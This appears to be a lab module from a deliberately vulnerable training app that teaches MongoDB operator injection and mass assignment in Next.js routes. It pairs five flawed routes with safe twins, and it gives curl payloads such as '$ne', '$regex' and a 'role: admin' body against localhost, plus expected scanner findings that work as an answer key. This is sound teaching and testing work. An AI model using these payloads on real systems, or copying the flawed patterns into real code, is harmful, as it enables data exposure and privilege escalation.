# Module: Workshop people (second MongoDB batch)

The people routes of [the workshop batch](workshop.md) (MONGO-047 to MONGO-051). Techniques demonstrated: a request object spread after a constant map, a whole body in a `replaceOne` replacement (CWE-915), a spread over a fixed condition with flat-query twins, a JSON cookie behind a string comparison, and a scalar branch without a shape check beside a filtered array branch.

The routes use the native `mongodb` driver against [mongodb-memory-server](https://www.npmjs.com/package/mongodb-memory-server) (MongoDB 8.2.6, loopback, synthetic data). The full answer key is in [workshop.md](workshop.md). Scope: injection only.

## Contents

| Scenario | Agent ref | Student guide | Exploit lab | Vuln vs protected | Tests |
| --- | --- | --- | --- | --- | --- |
| [MONGO-047 · A request object spread after a constant map](#mongo-047) | [expected finding](#mongo-047-agent) | [guide](#mongo-047-student) | [Burp · Postman · curl](#mongo-047-exploit) | [comparison](#mongo-047-safe) | [tests](#mongo-047-tests) |
| [MONGO-048 · A whole body in the replacement document](#mongo-048) | [expected finding](#mongo-048-agent) | [guide](#mongo-048-student) | [Burp · Postman · curl](#mongo-048-exploit) | [comparison](#mongo-048-safe) | [tests](#mongo-048-tests) |
| [MONGO-049 · A whole body spread over a fixed condition](#mongo-049) | [expected finding](#mongo-049-agent) | [guide](#mongo-049-student) | [Burp · Postman · curl](#mongo-049-exploit) | [comparison](#mongo-049-safe) | [tests](#mongo-049-tests) |
| [MONGO-050 · A JSON cookie behind a string comparison](#mongo-050) | [expected finding](#mongo-050-agent) | [guide](#mongo-050-student) | [Burp · Postman · curl](#mongo-050-exploit) | [comparison](#mongo-050-safe) | [tests](#mongo-050-tests) |
| [MONGO-051 · A scalar branch without a shape check](#mongo-051) | [expected finding](#mongo-051-agent) | [guide](#mongo-051-student) | [Burp · Postman · curl](#mongo-051-exploit) | [comparison](#mongo-051-safe) | [tests](#mongo-051-tests) |

## Safe cases and why they are tricky

| Safe source | Control for | Why it is safe | Wrong reasoning it catches |
| --- | --- | --- | --- |
| `pages/api/workshop/people/crew.js` | MONGO-047, MONGO-049 | Only the named field survives `pick`, as text, and the team is a fixed value in the filter. | Reporting a route as safe because a helper is present — or dangerous because the body is near the filter. |
| `pages/api/workshop/people/sheet.js` | MONGO-048 | Only one named field of the body can enter the replacement; the rest of the row is copied from the store. | Reporting `replaceOne` because the body is near the replacement without reading the pick. |
| `pages/api/workshop/people/finder.js` | MONGO-049 | Next.js gives a Pages Router handler a flat query object: values are strings or arrays of strings, and `team[$ne]=x` is an unrelated parameter name. | Assuming `req.query` holds nested objects, as in Express with `qs`. |
| `pages/api/workshop/people/roster.js` | MONGO-049 | Only two named fields survive an own-key allowlist, and their values are flat strings. | Reporting a query-built filter without reading the key allowlist. |
| `pages/api/workshop/people/latest.js` | MONGO-050 | The template string of `view.team` runs the value through text conversion; an object becomes `[object Object]`. | Reporting every parsed cookie in a filter without reading the coercion. |
| `pages/api/workshop/people/units.js` | MONGO-051 | Both branches keep only the two constant names; anything else falls to `$in []` or `'none'`. | Reading the array branch and missing the scalar branch — or the reverse. |
| `pages/api/workshop/people/others.js` | MONGO-051 | The operator is fixed and the values are elements of `$nin`; the server refuses an operator object inside the array (measured on MongoDB 8.2.6). | Reporting `$nin` because a request array feeds it. |

## Vulnerable cases that look safe

| Vulnerable source | What looks like a control | Why it is not |
| --- | --- | --- |
| `pages/api/workshop/people/bureau.js` (MONGO-047) | A constant map picks the base filter | The map decides the base, but the request object is merged *after* it and replaces the fixed team; the map is decoration. |
| `pages/api/workshop/people/card.js` (MONGO-048) | The current document is spread first | The replacement is the stored row merged with the whole request body, so the caller sets any field of it, including `role` (CWE-915). |
| `pages/api/workshop/people/group.js` (MONGO-049) | A fixed `team: 'floor'` in the filter | The whole body is spread after the fixed team, so the caller replaces it with an operator or adds any keys. |
| `pages/api/workshop/people/recent.js` (MONGO-050) | A guard that rewrites `board` to `floor` | The guard compares with `===` against one string; an operator object passes it and reaches the filter as it is. |
| `pages/api/workshop/people/teams.js` (MONGO-051) | The array branch filters `board` out, and a scalar `board` is refused | The scalar branch keeps the value's shape, and the refusal is a string comparison, so an operator object matches the team the route refuses by name. |

---

<a id="mongo-047"></a>
## MONGO-047 · A request object spread after a constant map

<a id="mongo-047-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/people/bureau.js` |
| Safe control | `pages/api/workshop/people/crew.js` |
| Route | `POST /api/workshop/people/bureau` vs `/api/workshop/people/crew` |
| Flow | body `only` → spread after a constant-map view → `find` |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-047-student) · [Exploit lab](#mongo-047-exploit) · [Vuln vs protected](#mongo-047-safe) · [Tests](#mongo-047-tests)

<a id="mongo-047-student"></a>
### Student guide

A constant map is a real control — when it is the *last* thing that touches the filter. Here the map's view is spread first and the request's `only` object second, so the caller's keys win: one `{"team":{"$ne":"floor"}}` turns the floor listing into everyone else. The same file looks guarded (own-key lookup, 400 on an unknown view) — all of that still happens, and none of it constrains the merge. The twin keeps one named field through `pick` and adds the fixed team.

<a id="mongo-047-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/people/bureau -H 'Content-Type: application/json' \
  -d '{"view":"floor","only":{"team":{"$ne":"floor"}}}'
# people include admin (board)

curl -s -X POST http://127.0.0.1:3000/api/workshop/people/crew -H 'Content-Type: application/json' \
  -d '{"view":"floor","only":{"team":{"$ne":"floor"}}}'
# people: alice only
```

**Observation that proves exploitation:** the board row (`admin`) appears in a route whose map only offers the two non-board views.

<a id="mongo-047-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/people/bureau.js` | vulnerable | The map decides the base of the filter, but the request object is merged after it and replaces the fixed team; the constant map is decoration, not a control. |
| `pages/api/workshop/people/crew.js` | protected | Only the named field survives `pick`, as text, and the team is a fixed value in the filter. |

The control is scoped to this flaw.

<a id="mongo-047-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-048"></a>
## MONGO-048 · A whole body in the replacement document

<a id="mongo-048-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/people/card.js` |
| Safe control | `pages/api/workshop/people/sheet.js` |
| Route | `POST /api/workshop/people/card` vs `/api/workshop/people/sheet` |
| Flow | body → spread after the current document → `replaceOne` replacement |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-915 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-048-student) · [Exploit lab](#mongo-048-exploit) · [Vuln vs protected](#mongo-048-safe) · [Tests](#mongo-048-tests)

<a id="mongo-048-student"></a>
### Student guide

`replaceOne` writes the replacement document *whole* — whatever lands there is the row after the call. This route merges the stored row with the entire request body, so one key `{"role":"admin"}` promotes the user. That is CWE-915: the caller sets a field it must not control. Spreading the current document first only preserves fields the body does not name. The twin allows exactly one body field (the email) through `pick`; the identical `role` key is dropped on the floor.

<a id="mongo-048-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes, then read the effect back.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/people/card -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
# {"changed":1}

curl -s -X POST http://127.0.0.1:3000/api/workshop/people/sheet -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
# {"changed":1} — but the role key was dropped

# Read the effect back: only the card route stored the role.
curl -s 'http://127.0.0.1:3000/api/workshop/people/finder?login=alice'
# after the card call: person role is admin
```

**Observation that proves exploitation:** the read-back shows `alice` with `role: admin` after the card call; after the sheet call the role is still `user`.

<a id="mongo-048-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/people/card.js` | vulnerable | The replacement document is the stored row merged with the whole request body, so the caller can set any field of it, including `role`. |
| `pages/api/workshop/people/sheet.js` | protected | Only one named field of the body can enter the replacement; the rest of the row is copied from the store. |

The control is scoped to this flaw.

<a id="mongo-048-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route (and the read-back) and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-049"></a>
## MONGO-049 · A whole body spread over a fixed condition

<a id="mongo-049-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/people/group.js` |
| Safe control | `pages/api/workshop/people/crew.js` |
| Other safe cases | `pages/api/workshop/people/finder.js`, `pages/api/workshop/people/roster.js` |
| Route | `POST /api/workshop/people/group` vs `/api/workshop/people/crew` |
| Flow | body → spread after the fixed team → `find` |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-049-student) · [Exploit lab](#mongo-049-exploit) | [Vuln vs protected](#mongo-049-safe) · [Tests](#mongo-049-tests)

<a id="mongo-049-student"></a>
### Student guide

`{team: 'floor', ...req.body}` puts the fixed condition *first*, so the body replaces it — one operator key widens the listing to the board team. The two query twins show the other side of the same form: `people/finder` passes the whole `req.query` as the filter, which looks worse but is safe here because a Pages Router query is flat — every value is a string, and `team[$ne]=floor` is one strange parameter name. `people/roster` allowlists the keys by name.

<a id="mongo-049-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/people/group -H 'Content-Type: application/json' \
  -d '{"team":{"$ne":"floor"}}'
# people include admin

curl -s -X POST http://127.0.0.1:3000/api/workshop/people/crew -H 'Content-Type: application/json' \
  -d '{"team":{"$ne":"floor"}}'
# people: alice only

# The query twins get the same text as a query string, where it is inert:
curl -s 'http://127.0.0.1:3000/api/workshop/people/finder?team%5B%24ne%5D=floor'
# person: null — the whole thing is one parameter name
```

**Observation that proves exploitation:** the spread route lists the board row; the pick route lists only the floor, and the flat-query twins cannot carry an operator at all.

<a id="mongo-049-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/people/group.js` | vulnerable | The whole body is merged after `{team:'floor'}` and can replace the team with an operator or add any keys. |
| `pages/api/workshop/people/crew.js` | protected | Only the named field survives `pick`, as text, and the team is fixed. |
| `pages/api/workshop/people/finder.js` | protected | A flat query: values are strings or arrays of strings, so no operator can arrive. |
| `pages/api/workshop/people/roster.js` | protected | Only two named fields survive the key allowlist. |

The control is scoped to this flaw.

<a id="mongo-049-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route (including the query-string form on the query twins); every route accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-050"></a>
## MONGO-050 · A JSON cookie behind a string comparison

<a id="mongo-050-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/people/recent.js` |
| Safe control | `pages/api/workshop/people/latest.js` |
| Route | `GET /api/workshop/people/recent` vs `/api/workshop/people/latest` |
| Flow | `view` cookie → `JSON.parse` → `view.team` behind a string guard → `find` filter |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-050-student) · [Exploit lab](#mongo-050-exploit) · [Vuln vs protected](#mongo-050-safe) · [Tests](#mongo-050-tests)

<a id="mongo-050-student"></a>
### Student guide

A cookie is caller text, and `JSON.parse` turns it into structure — including an operator object inside `team`. The guard `if (view.team === 'board') view.team = 'floor'` looks like a policy (board stays hidden) but compares against one string, so `{"$ne":"floor"}` passes untouched and the filter matches the board. The twin runs the same cookie through a template string, so the object becomes the text `[object Object]` and matches nothing.

<a id="mongo-050-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same cookie to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s 'http://127.0.0.1:3000/api/workshop/people/recent' \
  -H 'Cookie: view={"team":{"$ne":"floor"}}'
# people include admin

curl -s 'http://127.0.0.1:3000/api/workshop/people/latest' \
  -H 'Cookie: view={"team":{"$ne":"floor"}}'
# people: none — "[object Object]" matches no team
```

**Observation that proves exploitation:** the guarded route still lists the board row, which is exactly what its guard was written to prevent.

<a id="mongo-050-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/people/recent.js` | vulnerable | The cookie is parsed as JSON and its team goes to the filter as it arrives; the `===` guard only catches the exact string `board`. |
| `pages/api/workshop/people/latest.js` | protected | The template string runs the value through text conversion; an object becomes `[object Object]`. |

The control is scoped to this flaw.

<a id="mongo-050-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-051"></a>
## MONGO-051 · A scalar branch without a shape check

<a id="mongo-051-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/people/teams.js` |
| Safe control | `pages/api/workshop/people/units.js` |
| Other safe cases | `pages/api/workshop/people/others.js` |
| Route | `POST /api/workshop/people/teams` vs `/api/workshop/people/units` |
| Flow | body `teams` → scalar branch kept as it is → `find` filter |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-051-student) · [Exploit lab](#mongo-051-exploit) · [Vuln vs protected](#mongo-051-safe) · [Tests](#mongo-051-tests)

<a id="mongo-051-student"></a>
### Student guide

The array branch of this route is careful: it filters `board` out of the list and feeds `$in`. The scalar branch — the same parameter, sent as one value instead of a list — is not: the value keeps its shape, and the `board` refusal is a string comparison that an object passes. So `{"$regex":".*"}` lists the team the route refuses by name. The twin handles both branches against the same constant list, so the scalar falls to `'none'`. The second control fixes the operator (`$nin`) and only lets the request add *exclusions*, which cannot disclose the board team.

<a id="mongo-051-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to all three routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/people/teams -H 'Content-Type: application/json' \
  -d '{"teams":{"$regex":".*"}}'
# people include admin — the team refused by name is listed by pattern

curl -s -X POST http://127.0.0.1:3000/api/workshop/people/units -H 'Content-Type: application/json' \
  -d '{"teams":{"$regex":".*"}}'
# people: none

curl -s -X POST http://127.0.0.1:3000/api/workshop/people/others -H 'Content-Type: application/json' \
  -d '{"teams":{"$regex":".*"}}'
# people: alice only — the board team stays excluded
```

**Observation that proves exploitation:** only the scalar-branch route returns the board row for the identical value.

<a id="mongo-051-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/people/teams.js` | vulnerable | The scalar branch keeps the value's shape and the `board` refusal is a string comparison, so an operator object passes it. |
| `pages/api/workshop/people/units.js` | protected | Both branches keep only the two constant names; anything else falls to `$in []` or `'none'`. |
| `pages/api/workshop/people/others.js` | protected | The operator is fixed and the values are elements of `$nin`; an operator object inside the array is refused by the server. |

The control is scoped to this flaw.

<a id="mongo-051-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.
